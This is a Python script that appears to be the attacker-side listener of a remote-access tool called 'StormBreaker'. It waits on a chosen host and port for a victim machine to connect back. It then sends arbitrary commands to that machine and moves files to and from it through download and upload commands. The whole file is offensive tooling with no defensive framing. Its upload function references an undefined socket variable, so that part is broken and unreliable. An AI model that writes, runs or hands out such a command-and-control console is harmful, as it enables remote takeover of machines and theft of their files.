import socket
import os


def upload_file(conn, file_name):
	with open(file_name, 'rb')as f:
	    data = f.read(1024)
	    while data:
	        s.send(data)
	        data = f.read(1024)


def download_file(conn, file_name):
    with open(file_name, "wb") as f:
        raw_data = conn.recv(1024)
        while raw_data:
            f.write(raw_data)
            raw_data = conn.recv(1024)
    print("[+] Download Finished!")


def listener():
    lhost = input("\n      [*] Enter LHOST: ")
    lport = int(input("      [*] Enter LPORT: "))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((lhost, lport))
    except:
        print("\n      [-] Invalid IP Adress!\n")
    else:
        print("      [*] Listening for Conections...")
        s.listen()
        conn, addr = s.accept()
        print(f"\n      [+] Connected to {addr[0]}\n")

        while True:
            command = input(f"<<StormBreaker@{addr[0]}>> ")
            if command != "":
                if command == 'clear':
                    os.system('clear')
                elif command[:8] == 'download':
                    conn.send(f"download {command[9:]}".encode())
                    print("[*] Downloading File...")
                    download_file(conn, command[9:])
                elif command[:6] == 'upload':
                    conn.send(f"upload {command[7:]}".encode())
                    upload_file(conn, command[7:])
                elif command != "quit":
                    conn.send(command.encode())
                    recieved_data = conn.recv(5000).decode()
                    print(recieved_data)
                else:
                    conn.close()
                    print("\n[-] Connection Closed!\n")
                    break
            else:
                pass
